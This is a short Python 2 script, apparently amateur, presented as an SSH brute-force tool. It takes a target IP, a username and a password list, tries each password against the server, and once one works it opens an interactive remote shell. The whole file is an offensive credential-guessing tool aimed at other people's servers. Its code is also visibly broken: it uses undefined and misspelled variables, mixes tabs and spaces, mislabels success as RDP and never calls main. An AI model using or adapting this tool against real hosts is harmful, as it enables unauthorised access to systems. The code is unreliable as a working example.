#!/usr/bin/python
# -*- coding: utf-8 -*-

# ( -- IMPORTS -- ) #
import argparse
import pxssh
import time

# ( -- LOGO * INFO -- ) #
bugs = '''
   ____  ____ ____  _   _       ____  ____  _   _ _____ _____ _____ ___  ____   ____ _____ 
  / __ \/ ___/ ___|| | | |     | __ )|  _ \| | | |_   _| ____|  ___/ _ \|  _ \ / ___| ____|
 / / _` \___ \___ \| |_| |_____|  _ \| |_) | | | | | | |  _| | |_ | | | | |_) | |   |  _|  
| | (_| |___) |__) |  _  |_____| |_) |  _ <| |_| | | | | |___|  _|| |_| |  _ <| |___| |___ 
 \ \__,_|____/____/|_| |_|     |____/|_| \_\\___/  |_| |_____|_|   \___/|_| \_\\____|_____|
  \____/                                                                                   
\n[$] BUGS SSH-BRUTEFORCE.
[$] URL = ("https://www.Brazzers.com/BUGS").
[$] SCRIPT PROGRAMMED BY BUGS WITH PYTHON2.
'''
#################################
# ( -- PROGRAMMED BY @BUGS -- ) #
#################################

# ( -- FULL SCRIPT -- ) #
def connect(ip, user, password):
	Failed = 0

	try:
		x = pxssh.pxssh()
		x.login(ip, user, password)
		print 'FOUND RDP X> ( ' + ip + ' / ' + user + ' / ' + password
		return s
	except Exception, e:
		if Fails > 5:
			print "ERROR : TOO MANY SOCKESTS TIMEOUTED" 
			exit(0)
		elif 'nonblocking' in str(e):
			Fails += 1
			time.sleep(3)
			return connect(ip, user, password)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			return connect(ip, user, password)
		return None

def main():
    parser = argparse.ArgumentParser()
	
    parser.add_argument('ip', help='TARGETED IP')
    parser.add_argument('user', help='TARGETED USER')
    parser.add_argument('file', help='TARGETED PASSWORD')
    
    args = parser.parse_args()
	
    if args.ip and args.user and args.file:
    	with open(args.file, 'r') as infile:
    	    for line in infile:
                password = line.strip('\r\n')
	        print 'Testing: ' + str(password)
                con = connect(args.ip, args.user, password)
		if con:
		    print '[SSH CONNECTED, ENTER (Q/q) TO QUIT]'
		    command = raw_input(">")
		    while command != 'q' and command != 'Q':
			con.sendline (command)
            		con.prompt()
            		print con.before
			command = raw_input(">")
    else:
        print parser.usage
        exit(0)